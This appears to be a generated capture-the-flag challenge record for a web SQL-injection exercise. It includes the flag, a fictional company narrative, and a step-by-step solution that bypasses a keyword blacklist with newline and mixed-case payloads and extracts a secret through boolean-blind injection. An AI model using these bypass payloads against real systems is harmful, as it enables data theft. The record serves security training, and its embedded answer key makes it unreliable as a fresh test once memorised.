@@ -1,0 +1,50 @@
+{
+  "run_number": 29,
+  "arm": "vanilla",
+  "terminal_state": "COMPLETE",
+  "quality_score": 95.0,
+  "calibrated_difficulty": 2.25,
+  "target_difficulty": 1.5,
+  "category": "sqli",
+  "challenge_type": "web",
+  "title": "VerdantPulse Telemetry Core",
+  "description": "Welcome to the VerdantPulse Systems technician portal. As a newly hired consultant, your goal is to audit the TeleCore infrastructure. Management is particularly concerned about the security of the 'System Node Configs'\u2014a table containing cryptographic keys that should never be accessible to standard technicians. Find a way to extract the master node secret (the flag).",
+  "flag": "LEVELUP{wT5XqRzBplj3IMAt1D36674u1qFRTmdA}",
+  "solution": "1. Browse the application and view the HTML source. In the 'Dashboard' section, find a commented-out JavaScript block referencing an internal API: `/api/v1/telemetry/query`.\n2. Test the endpoint with a POST request: `curl -X POST http://localhost:5000/api/v1/telemetry/query -H 'Content-Type: application/json' -d '{\"sensor_id\": \"SENS-001\"}'`. It returns sensor data.\n3. Attempt basic SQLi: `{\"sensor_id\": \"SENS-001'\"}`. The application returns a 'Security Filter Triggered' message if keywords like SELECT, UNION, or spaces are detected.\n4. Bypass the WAF: Use Newline characters (\\n) instead of spaces and mixed-case keywords (e.g., sElEcT) or logic that avoids the blacklist. The filter blocks: ['SELECT', 'UNION', 'WHERE', 'OR', 'AND', '--', '/*', ' '].\n5. Use a Boolean-based blind approach. Since 'OR' and 'AND' are blocked, use the '||' and '&&' operators (if supported) or SQLite's `ABS()` / `CASE` logic. Alternatively, use the `sensor_id` with a subquery: `SENS-001'=(sElEcT\\nnode_secret\\nfRoM\\nsystem_node_configs\\nlIkE\\n'LEVELUP{%')--`. Note: '--' is blocked, but we can close the quote: `SENS-001'\\n||\\n(sElEcT\\n'a'\\nfRoM\\nsystem_node_configs\\nlIkE\\n'L%')='a`. \n6. Script the extraction: Iterate through characters to leak the `node_secret` from the `system_node_configs` table using the `LIKE` operator or `substr` and boolean responses ('Sensor data retrieved' vs 'No data found').",
+  "docker_image_tag": "levelup-challenge-f07d9cf2",
+  "narrative_context": {
+    "company_name": "VerdantPulse Systems",
+    "industry": "manufacturing",
+    "scenario": "VerdantPulse Systems is a global leader in automated vertical farming solutions, providing the infrastructure to feed densely populated urban areas. Their core business relies on precise control over environmental variables across thousands of distributed greenhouse modules. Recently, the company has integrated several smaller regional agricultural tech startups, leading to a complex web of legacy systems and modern APIs that their centralized IT department is struggling to unify.\n\nAs the company prepares for its IPO, the Board of Directors has mandated a series of deep-dive security assessments. The internal security team, currently focused on a massive cloud migration project, has requested external expertise to evaluate the resilience of their core operational dashboards. You have been brought in as a security auditor to explore the data integrity and access controls of their primary field-monitoring tool.",
+    "app_name": "BioSync Growth Monitor",
+    "app_purpose": "Allows agricultural technicians to monitor real-time sensor data, query historical harvest logs, and manage nutrient distribution profiles for various crop cycles.",
+    "data_theme": "Agricultural sensor logs, crop batch IDs, nutrient mixture formulations, and technician shift schedules.",
+    "flavor_details": {
+      "company_motto": "Nurturing the Future, Digitizing the Soil.",
+      "department": "Agricultural Operations & Analytics",
+      "recent_event": "A recent merger with 'LeafLogic' brought in a legacy database that was hurriedly integrated into the BioSync platform to meet quarterly reporting deadlines.",
+      "tech_hints": [
+        "Traditional server-side rendered forms",
+        "Dynamic reporting engine",
+        "Heavy reliance on relational data mapping",
+        "Legacy SQL-based search components"
+      ]
+    }
+  },
+  "calibration_notes": "Source analysis: The challenge implements a highly restrictive blacklist that blocks essential SQL keywords (SELECT, UNION, WHERE, OR, AND) and structural characters (spaces, comments). To exploit this, an attacker must leverage SQLite-specific quirks like the 'TABLE' statement as a SELECT substitute and use whitespace alternatives like tabs or newlines. The requirement for a blind extraction while bypassing such a thorough word-based filter elevates this to the high-Hard/Expert tier. (target was 1.5)",
+  "verification_level": "smoke_tested",
+  "static_analysis_passed": true,
+  "smoke_test_passed": true,
+  "pipeline_states": [
+    "INIT",
+    "NARRATIVE",
+    "GENERATE",
+    "STATIC_ANALYSIS",
+    "VALIDATE",
+    "CALIBRATE",
+    "SMOKE_TEST",
+    "QUALITY_SCORE",
+    "DEPLOY",
+    "COMPLETE"
+  ]
+}
